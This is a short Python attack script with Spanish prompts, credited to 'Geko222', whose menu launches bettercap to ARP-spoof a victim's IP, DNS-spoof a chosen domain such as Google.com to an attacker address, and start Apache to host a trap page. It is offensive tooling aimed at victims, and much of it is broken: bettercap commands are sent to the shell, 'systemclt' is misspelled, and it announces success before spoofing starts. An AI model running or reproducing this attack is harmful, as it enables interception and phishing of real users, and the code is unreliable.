import os
import time

os.system("clear")

print("""
 ____    ____  _____  _________  ____    ____  
|_   \  /   _||_   _||  _   _  ||_   \  /   _|        .)/     )/,
  |   \/   |    | |  |_/ | | \_|  |   \/   |             /`-._,-'`._,@`-,   
  | |\  /| |    | |      | |      | |\  /| |       ,  _,-=\,-.__,-.-.__@/
 _| |_\/_| |_  _| |_    _| |_    _| |_\/_| |_   (_,'    )\`    '(`   
|_____||_____||_____|  |_____|  |_____||_____|                      ➢By Geko222
      
""")

menu = int(input("Eliga una opcion \n \n [1] Instalar recursos \n [2] Iniciar ataque MITM \n [3] Montar servidor de pagania para ataque \n \n->"))

if menu == 1:
    os.system("sudo bash instalador.sh")

elif menu == 2:
    os.system("sudo bettercap")
    ipvic = input("Indique la ip de la victima: ")
    os.system("set arp.spoof targets " + ipvic)
    os.system("arp.spoof on")
    os.system("clear")
    dominio = input("Indique un dominio para el ataque (Ej: Google.com): ")
    os.system("set dns.spoof.domains " + dominio)
    trampa = input("Indique la direcion a donde llevar a la victima: ")
    os.system("set dns.spoof.address " + trampa)
    print("EL ATAQUE SE ESTA REALIZANDO CON EXITO")
    os.system("dns.spoof on")
  


elif menu == 3:
    os.system("cd /var/www/html")
    os.system("sudo systemclt start apache2")
